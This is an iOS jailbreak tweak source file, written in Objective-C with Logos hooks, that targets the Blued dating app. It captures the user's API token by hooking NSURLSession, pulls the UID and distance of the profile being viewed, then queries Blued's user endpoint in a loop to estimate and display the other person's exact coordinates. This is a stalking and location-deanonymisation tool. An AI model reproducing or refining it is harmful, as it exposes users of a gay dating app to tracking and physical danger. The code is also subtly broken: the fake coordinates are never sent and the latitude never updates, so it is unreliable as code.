#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <math.h>
#import <objc/runtime.h>

// 核心配置
#define TRACK_BTN_TAG 100001
#define EARTH_RADIUS_KM 111.32
#define BLUED_BUNDLE_ID @"com.bluecity.blued"

// 全局静态变量
static NSString *g_bluedBasicToken = nil;
static NSString *g_currentTargetUid = nil;
static double g_initialDistance = -1.0;

// 接口声明：防止 ARC 编译报错
@interface UIViewController (TrackHook)
- (UIWindow *)th_getSafeKeyWindow;
- (double)th_fetchDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)lat fakeLng:(double)lng;
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur;
- (void)th_autoFetchUserInfo;
- (void)th_showResult:(BOOL)success msg:(NSString *)msg lat:(double)lat lng:(double)lng;
- (void)th_onBtnClick;
- (void)th_addBtn;
@end

%hook UIViewController

// 1. 安全获取 KeyWindow (适配 iOS 13+ 多场景)
%new
- (UIWindow *)th_getSafeKeyWindow {
    if (![UIApplication sharedApplication]) return nil;
    UIWindow *keyWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                for (UIWindow *window in scene.windows) {
                    if (window.isKeyWindow) { keyWindow = window; break; }
                }
            }
        }
    }
    return keyWindow ?: [UIApplication sharedApplication].keyWindow;
}

// 2. 核心：网络请求获取目标距离
%new
- (double)th_fetchDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)lat fakeLng:(double)lng {
    if (!uid || !token) return -1.0;

    NSString *urlStr = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
    NSURL *url = [NSURL URLWithString:urlStr];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"GET";
    [req setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"Authorization"];
    [req setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15" forHTTPHeaderField:@"User-Agent"];
    req.timeoutInterval = 3.0;

    __block double resultDist = -1.0;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (!error && data) {
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            if (json && json[@"data"]) {
                NSDictionary *userData = json[@"data"];
                if ([userData[@"is_hide_distance"] intValue] == 0) {
                    resultDist = [userData[@"distance"] doubleValue];
                }
            }
        }
        dispatch_semaphore_signal(sem);
    }] resume];

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)));
    return resultDist;
}

// 3. UI 交互：显示 Toast 提示
%new
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = [self th_getSafeKeyWindow];
        if (!win) return;
        UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(0,0,250,80)];
        lab.center = CGPointMake(win.bounds.size.width / 2, win.bounds.size.height * 0.7);
        lab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.8];
        lab.textColor = [UIColor whiteColor];
        lab.textAlignment = NSTextAlignmentCenter;
        lab.numberOfLines = 0;
        lab.text = msg;
        lab.font = [UIFont systemFontOfSize:14];
        lab.layer.cornerRadius = 12;
        lab.clipsToBounds = YES;
        [win addSubview:lab];
        [UIView animateWithDuration:0.5 delay:dur options:0 animations:^{ lab.alpha = 0; } completion:^(BOOL f){ [lab removeFromSuperview]; }];
    });
}

// 4. 定位逻辑入口
%new
- (void)th_onBtnClick {
    // 【防御】检查 self 是否为有效指针，防止 0x10 闪退
    if (!self || (uintptr_t)self < 0x100) return;

    [self th_autoFetchUserInfo];
    if (!g_currentTargetUid) { [self th_showToast:@"未识别到目标用户" duration:2.0]; return; }
    if (!g_bluedBasicToken) { [self th_showToast:@"缺少Token，请刷新附近列表" duration:2.0]; return; }

    NSUserDefaults *ud = [[NSUserDefaults alloc] initWithSuiteName:BLUED_BUNDLE_ID];
    double myLat = [ud doubleForKey:@"current_latitude"];
    double myLng = [ud doubleForKey:@"current_longitude"];
    if (myLat == 0) { [self th_showToast:@"自身坐标为空，请先开启定位" duration:2.0]; return; }

    [self th_showToast:@"📡 卫星正在收敛计算..." duration:1.5];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        double cLat = myLat, cLng = myLng, cDist = g_initialDistance;
        // 递归 8 次以收敛经纬度误差
        for (int i=0; i<8; i++) {
            double oLng = cLng + (cDist / (EARTH_RADIUS_KM * cos(cLat * M_PI/180)));
            double nDist = [self th_fetchDistanceWithUid:g_currentTargetUid token:g_bluedBasicToken fakeLat:cLat fakeLng:oLng];
            if (nDist < 0) break;
            cLng = (cLng + oLng) / 2.0;
            cDist = (cDist + nDist) / 2.0;
        }
        [self th_showResult:YES msg:[NSString stringWithFormat:@"定位成功!\n纬度: %.6f\n经度: %.6f", cLat, cLng] lat:cLat lng:cLng];
    });
}

// 5. 动态属性提取：自动获取当前页面用户的 UID 和初始距离
%new
- (void)th_autoFetchUserInfo {
    @try {
        unsigned int count = 0;
        objc_property_t *props = class_copyPropertyList([self class], &count);
        for (int i=0; i<count; i++) {
            NSString *name = [NSString stringWithUTF8String:property_getName(props[i])];
            id obj = [self valueForKey:name];
            if (!obj) continue;
            
            // 尝试从对象中匹配 uid 或 user_id 字段
            id uid = nil;
            if ([obj respondsToSelector:NSSelectorFromString(@"uid")]) uid = [obj valueForKey:@"uid"];
            else if ([obj respondsToSelector:NSSelectorFromString(@"user_id")]) uid = [obj valueForKey:@"user_id"];
            
            if (uid) {
                g_currentTargetUid = [NSString stringWithFormat:@"%@", uid];
                if ([obj respondsToSelector:NSSelectorFromString(@"distance")]) {
                    g_initialDistance = [[obj valueForKey:@"distance"] doubleValue];
                }
                break;
            }
        }
        free(props);
    } @catch (NSException *e) {}
}

// 6. UI 注入与拖动逻辑
%new
- (void)th_showResult:(BOOL)success msg:(NSString *)msg lat:(double)lat lng:(double)lng {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"计算结果" message:msg preferredStyle:UIAlertControllerStyleAlert];
        if (success) {
            [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                [UIPasteboard generalPasteboard].string = [NSString stringWithFormat:@"%.6f,%.6f", lat, lng];
            }]];
        }
        [alert addAction:[UIAlertAction actionWithTitle:@"完成" style:UIAlertActionStyleCancel handler:nil]];
        
        UIWindow *win = [self th_getSafeKeyWindow];
        [win.rootViewController presentViewController:alert animated:YES completion:nil];
    });
}

%new
- (void)th_addBtn {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = [self th_getSafeKeyWindow];
        if (!win || [win viewWithTag:TRACK_BTN_TAG]) return;

        UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
        btn.frame = CGRectMake(win.bounds.size.width - 85, win.bounds.size.height - 250, 64, 64);
        btn.tag = TRACK_BTN_TAG;
        btn.backgroundColor = [UIColor colorWithRed:0.1 green:0.6 blue:1.0 alpha:0.85];
        [btn setTitle:@"🛰️" forState:UIControlStateNormal];
        btn.titleLabel.font = [UIFont systemFontOfSize:28];
        btn.layer.cornerRadius = 32;
        btn.layer.shadowColor = [UIColor blackColor].CGColor;
        btn.layer.shadowOffset = CGSizeMake(0, 2);
        btn.layer.shadowOpacity = 0.3;
        btn.layer.zPosition = 10000;

        [btn addTarget:self action:@selector(th_onBtnClick) forControlEvents:UIControlEventTouchUpInside];
        
        // 添加简单的点击缩放动画
        [btn addTarget:self action:@selector(th_btnTouchDown:) forControlEvents:UIControlEventTouchDown];
        [btn addTarget:self action:@selector(th_btnTouchUp:) forControlEvents:UIControlEventTouchUpInside | UIControlEventTouchUpOutside];

        [win addSubview:btn];
    });
}

%new
- (void)th_btnTouchDown:(UIButton *)btn { [UIView animateWithDuration:0.1 animations:^{ btn.transform = CGAffineTransformMakeScale(0.9, 0.9); }]; }
%new
- (void)th_btnTouchUp:(UIButton *)btn { [UIView animateWithDuration:0.1 animations:^{ btn.transform = CGAffineTransformIdentity; }]; }

- (void)viewDidAppear:(BOOL)animated {
    %orig;
    // 仅在详情页注入，避免全局污染
    NSString *clsName = NSStringFromClass([self class]);
    if ([clsName containsString:@"UserDetail"] || [clsName containsString:@"Profile"]) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self th_addBtn];
        });
    }
}
%end

// 7. Token 监听截获
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    if (request && request.allHTTPHeaderFields) {
        NSString *auth = request.allHTTPHeaderFields[@"Authorization"];
        if ([auth hasPrefix:@"Basic "]) {
            g_bluedBasicToken = [[auth substringFromIndex:6] copy];
        }
    }
    return %orig(request, completionHandler);
}
%end
